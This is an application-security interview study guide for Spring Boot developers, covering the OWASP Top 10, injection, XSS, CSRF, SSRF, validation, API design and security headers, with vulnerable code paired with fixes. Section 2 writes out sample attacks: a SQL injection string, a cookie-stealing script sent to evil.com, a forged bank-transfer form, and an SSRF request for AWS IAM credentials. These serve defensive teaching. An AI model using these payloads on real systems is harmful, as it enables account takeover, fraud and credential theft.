# Application Security — Interview Prep
---

## SECTION 1: OWASP TOP 10

### Q1. Walk through the OWASP Top 10 — not just the list, but what each category actually means for a Java/Spring Boot developer day-to-day.
**Answer:** The OWASP Top 10 is the industry-standard, periodically-updated list of the most critical web application security risks — interviewers use it to check whether security is something you actively design for, not an afterthought bolted on before a compliance audit.

| # | Category | What it actually means in practice |
|---|---|---|
| A01 | **Broken Access Control** | Users can act outside their intended permissions — e.g., changing an ID in a URL to access another user's data (IDOR) |
| A02 | **Cryptographic Failures** | Sensitive data exposed due to weak/missing encryption — plaintext passwords, unencrypted data in transit, weak hashing |
| A03 | **Injection** | Untrusted input executed as code/commands — SQL Injection, OS command injection (Q2) |
| A04 | **Insecure Design** | Security flaws baked into the architecture itself, not fixable by a patch — e.g., no rate limiting on a password reset flow by design |
| A05 | **Security Misconfiguration** | Default credentials left in place, verbose error messages leaking stack traces, unnecessary features/ports enabled |
| A06 | **Vulnerable and Outdated Components** | Using dependencies with known CVEs (MOD7_005 Q3's SCA scanning exists specifically for this) |
| A07 | **Identification and Authentication Failures** | Weak password policies, session fixation, missing MFA, predictable session tokens |
| A08 | **Software and Data Integrity Failures** | Trusting unsigned code/updates, insecure CI/CD pipelines, insecure deserialization |
| A09 | **Security Logging and Monitoring Failures** | Attacks go undetected because nothing is logged/alerted on (ties directly to MOD6_001's observability) |
| A10 | **Server-Side Request Forgery (SSRF)** | The server is tricked into making requests to unintended destinations (Q2) |

**Senior-level answer:** "I don't treat this as a list to memorize for a quiz — I treat it as a **checklist I actually run new features against** during design review. For any endpoint accepting user input, I ask: could this enable injection (A03)? Does the authorization check verify the requester actually owns this resource, not just that they're authenticated at all (A01)? Are we logging the security-relevant events here so an incident would actually be detectable (A09)? The categories that come up most in my day-to-day Spring Boot work are A01, A03, and A05 — broken access control and injection because they're the most directly exploitable, and misconfiguration because it's the easiest to accidentally introduce (an actuator endpoint left open, a permissive CORS config copy-pasted from a tutorial)."

---

## SECTION 2: SQL INJECTION, XSS, CSRF & SSRF

### Q2. Explain SQL Injection, XSS, CSRF, and SSRF — for each, show the vulnerable code, the exploit, and the actual fix.
**Answer:**

**SQL Injection** — untrusted input concatenated directly into a SQL query, letting an attacker alter the query's logic.
```java
// VULNERABLE — string concatenation
String query = "SELECT * FROM users WHERE username = '" + username + "'";
// Attacker input: ' OR '1'='1  →  query becomes: ... WHERE username = '' OR '1'='1'  → returns ALL users

// FIX — parameterized query / prepared statement, input is NEVER interpreted as SQL syntax
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);
// Spring Data JPA repositories use parameterized queries by default — this is exactly why raw
// native queries with string concatenation are the real danger zone to watch for in code review
```

**XSS (Cross-Site Scripting)** — untrusted input rendered into a page without proper encoding, letting an attacker's script execute in another user's browser.
```java
// VULNERABLE — user input rendered directly into HTML, unescaped
model.addAttribute("comment", userComment);   // Thymeleaf: <p th:utext="${comment}"> — utext = UNESCAPED
// Attacker submits: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

// FIX — escape output by default
<p th:text="${comment}">   // th:text escapes HTML automatically — the script tag renders as harmless literal text
```
"The rule I apply: **encode output based on context** — HTML-escape for HTML body content, attribute-escape for HTML attributes, JS-escape for content injected into a `<script>` block — using the templating engine's default-safe mode (Thymeleaf's `th:text`, not `th:utext`) rather than hand-rolling escaping logic, which is easy to get subtly wrong."

**CSRF (Cross-Site Request Forgery)** — a malicious site tricks a logged-in user's browser into submitting a request to your application, riding on their existing authenticated session.
```html
<!-- On evil.com, while the victim is logged into bank.com in another tab -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="toAccount" value="attacker-account"/>
  <input type="hidden" name="amount" value="10000"/>
</form>
<script>document.forms[0].submit()</script>
<!-- Browser automatically attaches bank.com's session cookie — the request looks legitimate to the server -->
```
```java
// FIX — Spring Security's built-in CSRF protection (enabled by default for session-based auth)
http.csrf(csrf -> csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));
// Server issues a per-session CSRF token the client must include on state-changing requests;
// evil.com has no way to know/obtain that token, so its forged request is rejected
```
"The important nuance here: CSRF protection matters for **cookie/session-based auth**, because the browser attaches cookies automatically regardless of which site initiated the request. For a **stateless, token-based API** (JWT in an `Authorization` header, MOD2_006), CSRF is largely a non-issue by design — the malicious site can't read/attach that header itself — which is exactly why Spring Security's CSRF protection is typically **disabled** for pure REST APIs using bearer tokens, and I always confirm which auth model is actually in play before deciding whether CSRF protection is needed."

**SSRF (Server-Side Request Forgery)** — the server itself is tricked into making a request to a destination the attacker chose, often reaching internal-only resources the attacker couldn't reach directly.
```java
// VULNERABLE — server fetches whatever URL the user provides, no validation
@GetMapping("/fetch-image")
public byte[] fetchImage(@RequestParam String imageUrl) {
    return restTemplate.getForObject(imageUrl, byte[].class);
}
// Attacker passes: http://169.254.169.254/latest/meta-data/iam/security-credentials/order-service-role
// → server obligingly fetches AWS's internal metadata endpoint and returns the cloud IAM credentials

// FIX — allowlist validation before ever making the request
private static final Set<String> ALLOWED_HOSTS = Set.of("images.trusted-cdn.com");
public byte[] fetchImage(@RequestParam String imageUrl) {
    URI uri = URI.create(imageUrl);
    if (!ALLOWED_HOSTS.contains(uri.getHost())) {
        throw new IllegalArgumentException("Host not allowed");
    }
    return restTemplate.getForObject(uri, byte[].class);
}
```
"SSRF is the one I find candidates most often underestimate — it's exactly the kind of vulnerability that lets an attacker pivot from 'this one public endpoint' to 'internal network resources, cloud metadata endpoints, or internal admin APIs' that were never meant to be internet-reachable at all. Any feature where the server fetches a **user-supplied URL** — webhook callbacks, 'import from URL', image proxies — deserves this exact allowlist scrutiny."

---

## SECTION 3: INPUT VALIDATION & OUTPUT ENCODING

### Q3. What's the actual difference between input validation and output encoding, and why do you need both — isn't one enough?
**Answer:** They solve **different problems at different points** in the data's lifecycle, and relying on only one leaves real gaps.

- **Input validation** — reject or normalize data **at the point of entry**, based on what's actually a valid value for that field (format, length, range, allowed characters) — this is a **business-correctness and defense-in-depth** control, not a complete security fix on its own.
- **Output encoding** — transform data **at the point of output**, based on the context it's being rendered into (HTML, SQL, JS, shell command) — this is what actually **neutralizes the specific injection risk** for that output context.

```java
// Input validation — Bean Validation, rejects malformed input up front
public class CreateUserRequest {
    @NotBlank
    @Size(max = 50)
    @Pattern(regexp = "^[a-zA-Z0-9_]+$")   // reject anything outside expected username characters
    private String username;

    @Email
    private String email;
}
```

**Why validation alone isn't sufficient — the trap this question is testing for:** "A common mistake is treating input validation as the *entire* security control — 'we validated the input, so it's safe everywhere it's used.' But the same valid string (say, a legitimate business name containing an apostrophe, `O'Brien's Bakery`) is **completely safe** in a parameterized SQL query, yet still needs **HTML-escaping** if rendered into a web page, and would need **shell-escaping** if it were ever (inadvisably) passed to a system command. Validation controls *what data is allowed in*; encoding controls *how that data is safely used at each specific output point* — you genuinely need both, and conflating them is exactly how a field that was 'already validated' ends up causing an XSS bug because nobody separately thought about the HTML-rendering context."

**Senior-level summary:** "My mental model: validate input as close to entry as possible for **data quality and defense-in-depth** (reject obviously malformed data early, fail fast), and encode output as close to the actual output boundary as possible for **injection prevention**, encoded appropriately for whatever that specific boundary is (SQL → parameterization, HTML → escaping, shell → avoid entirely if possible). Neither one substitutes for the other."

---

## SECTION 4: SECURE API DESIGN

### Q4. What does "secure API design" actually mean in practice for a Spring Boot REST API — walk through the concrete controls you'd put in place?
**Answer:**

**1. Authentication and Authorization, correctly layered:**
```java
@PreAuthorize("hasRole('ADMIN') or #userId == authentication.principal.id")
@GetMapping("/users/{userId}/orders")
public List<Order> getOrders(@PathVariable String userId) { ... }
// NOT just "is this request authenticated" (authentication) — but "is THIS user allowed to see THIS resource"
// (authorization) — this is the exact check that prevents IDOR / Broken Access Control (A01, Q1)
```

**2. Rate limiting** — protect against brute-force and abuse (MOD4_005 Q2's gateway-level rate limiting is the first line of defense; endpoint-specific limits matter extra for sensitive operations like login/password-reset).

**3. Never leak internal details in error responses:**
```java
// VULNERABLE — leaks stack trace, internal class names, potentially SQL details
@ExceptionHandler(Exception.class)
public ResponseEntity<String> handle(Exception e) {
    return ResponseEntity.status(500).body(e.toString());   // exposes internals to any caller
}

// FIX — generic external message, full detail logged internally only
@ExceptionHandler(Exception.class)
public ResponseEntity<ErrorResponse> handle(Exception e) {
    log.error("Unhandled exception", e);   // full detail goes to logs (MOD6_001), not the response
    return ResponseEntity.status(500).body(new ErrorResponse("An unexpected error occurred", traceId()));
}
```

**4. Mass assignment protection** — never bind a request body directly onto an entity with fields the client shouldn't be able to set.
```java
// VULNERABLE — client could include "role": "ADMIN" in the JSON body and self-promote
@PostMapping("/users")
public User create(@RequestBody User user) { return userRepository.save(user); }

// FIX — a dedicated DTO with ONLY the fields a client is actually allowed to set
public class CreateUserRequest { private String username; private String email; }   // no "role" field at all
@PostMapping("/users")
public User create(@RequestBody CreateUserRequest request) {
    User user = new User(request.getUsername(), request.getEmail());
    user.setRole(Role.USER);   // server decides this, never the client
    return userRepository.save(user);
}
```

**5. Least privilege on data exposure** — don't return the full entity if the client only needs a subset; a separate response DTO avoids accidentally leaking a password hash or internal fields via `@JsonIgnore` gaps.

**Senior-level answer tying it together:** "The common thread across all of these is: **never trust the client to only send/request what the UI intends** — an attacker interacts with the API directly, not through your frontend, so every check that 'the UI wouldn't let you do that' is not a security control at all. Authorization has to be enforced server-side per request, DTOs have to explicitly whitelist what's bindable, and error responses have to assume a hostile caller is reading them for reconnaissance."

---

## SECTION 5: SECURITY HEADERS

### Q5. What are the key HTTP security headers, what does each actually protect against, and how do you configure them in Spring Boot?
**Answer:**
| Header | Protects against | What it does |
|---|---|---|
| **Content-Security-Policy (CSP)** | XSS | Restricts which sources scripts/styles/images can load from — even if an XSS payload gets injected, CSP can prevent it from executing/exfiltrating |
| **Strict-Transport-Security (HSTS)** | Protocol downgrade / MITM | Forces browsers to only ever use HTTPS for this domain, even if a user types `http://` |
| **X-Content-Type-Options: nosniff** | MIME-sniffing attacks | Prevents the browser from guessing content type and executing something (e.g., a file uploaded as an image) as a script |
| **X-Frame-Options / frame-ancestors** | Clickjacking | Prevents the page from being embedded in a malicious `<iframe>` that tricks users into clicking hidden elements |
| **Referrer-Policy** | Information leakage | Controls how much URL/referrer information is sent to external sites when a user navigates away |

```java
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
            .httpStrictTransportSecurity(hsts -> hsts.includeSubDomains(true).maxAgeInSeconds(31536000))
            .frameOptions(frame -> frame.deny())
            .contentTypeOptions(Customizer.withDefaults())
        );
        return http.build();
    }
}
```

**Senior-level answer on why these matter even with "good code":** "Security headers are a form of **defense-in-depth** — they don't fix a vulnerability in your code, they **limit the blast radius** if one slips through anyway. CSP is the one I'd call out as the highest-value: even if an XSS payload somehow gets injected despite proper output encoding (Q2/Q3) — a genuine defense-in-depth scenario, not an excuse to skip encoding — a well-configured `script-src 'self'` policy means the browser simply **refuses to execute** an inline or externally-hosted malicious script, containing damage that would otherwise be a full account/session compromise. I treat headers as a mandatory second layer, never a replacement for actually fixing the underlying injection/validation issue."

**Follow-up: "What's a common CSP mistake teams make?"** → Starting with an overly permissive policy (`script-src *` or leaving `unsafe-inline` enabled indefinitely) "to get it working," then never tightening it — CSP only provides real protection when it's actually restrictive; a report-only mode (`Content-Security-Policy-Report-Only`) is the right way to iteratively tighten a policy safely, observing violations before enforcing them.

---

## QUICK-FIRE FOLLOW-UPS TO EXPECT (Rapid Round)

- "What's the difference between authentication and authorization, precisely?" → Authentication verifies **who you are** (login, token validation); authorization verifies **what you're allowed to do/access** — a request can be fully authenticated and still be a Broken Access Control violation (A01) if authorization isn't separately, correctly enforced per resource.
- "Does using an ORM like Hibernate/JPA automatically prevent SQL Injection?" → Mostly, via parameterized queries by default — but **native queries built with string concatenation**, or unsafe use of `Sort`/dynamic `ORDER BY` clauses built from raw user input, can still reintroduce injection even within JPA — the ORM protects you only when you use its parameterized APIs correctly.
- "What's the difference between encryption and hashing, in a security-headers-adjacent password-storage context?" → Encryption is reversible (decrypt with a key) and appropriate for data you need back in plaintext later; hashing (with a proper algorithm like bcrypt/Argon2, including salt) is one-way and correct for passwords, since the application should never need to recover the original plaintext password at all.
- "Is disabling CSRF protection on a REST API always safe?" → Only if authentication is genuinely stateless/token-based with no session cookie involved in the auth decision (Q2) — if there's ANY cookie-based session component still in play alongside token auth, CSRF risk can still exist and needs explicit evaluation, not an automatic "REST APIs don't need CSRF protection" assumption.
- "What's the OWASP category for insecure deserialization, and why does it matter for Java specifically?" → Falls under A08 (Software and Data Integrity Failures) — Java's native serialization is a well-known historical attack vector (a crafted serialized object can trigger arbitrary code execution via "gadget chains" in classpath libraries during deserialization) — the practical mitigation is avoiding native Java serialization for untrusted input entirely, preferring JSON with a schema-validating library instead.
- "How would you test for these vulnerabilities before they reach production?" → SAST tools (MOD7_005 Q3) catch some injection patterns statically; DAST (dynamic application security testing, actually probing a running instance) and dependency/SCA scanning catch others; but manual security-focused code review on authorization logic specifically is still essential, since broken access control is fundamentally a **business-logic** flaw that automated scanners are poor at detecting.

---

*Study tip: The distinction between input validation and output encoding (Q3) — and being able to explain why a "validated" field can still cause an XSS bug — is where interviewers most reliably separate candidates who've memorized the OWASP list from those who actually understand why each control exists. SSRF (Q2) is increasingly asked in cloud-native interviews specifically because of the cloud-metadata-endpoint attack pattern — have that exact example ready.*
